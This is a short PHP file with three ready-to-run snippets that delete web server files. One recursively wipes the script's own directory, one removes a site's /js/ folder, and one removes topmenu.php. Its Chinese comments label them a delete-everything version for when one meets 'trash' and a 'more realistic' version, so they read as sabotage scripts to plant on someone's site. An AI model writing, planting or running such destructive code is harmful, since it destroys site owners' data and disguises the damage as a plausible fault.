<!-- 他媽遇到廢物全刪版 -->
<?php
delFile('./');

function delFile($dirName,$delSelf=false){
    if(file_exists($dirName) && $handle = opendir($dirName)){
        while(false !==($item = readdir( $handle))){
            if($item != '.' && $item != '..'){
                if(file_exists($dirName.'/'.$item) && is_dir($dirName.'/'.$item)){
                    delFile($dirName.'/'.$item);
                }else{
                    if(!unlink($dirName.'/'.$item)){
                        return false;
                    }
                }
            }
        }
        closedir($handle);
        if($delSelf){
            if(!rmdir($dirName)){
                return false;
            }
        }
    }else{
        return false;
    }
    return true;
}
?>

<!-- 比較逼真版 -->
<?php
function deleteDirectory($dir) {
    if (!file_exists($dir)) {
        return true;
    }

    if (!is_dir($dir) || is_link($dir)) {
        return unlink($dir);
    }

    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }

        if (!deleteDirectory($dir . "/" . $item)) {
            chmod($dir . "/" . $item, 0777);

            if (!deleteDirectory($dir . "/" . $item)) {
                return false;
            }
        }
    }

    return rmdir($dir);
}

define('WWW_PATH', realpath(dirname(__FILE__) . '/../'));
$delFile = WWW_PATH . '/js/';

if (is_dir($delFile)) {
    deleteDirectory($delFile);
    echo "deleted";
} else {
    echo "none";
}
?>

<!-- 簡易刪檔案版 -->
<?php
define('WWW_PATH',realpath(dirname(__FILE__).'/../'));
$delFile = WWW_PATH . '/topmenu.php';

if(file_exists($delFile)){
	unlink($delFile);
	echo "delete";
}else{
	echo "file not found";
}
?>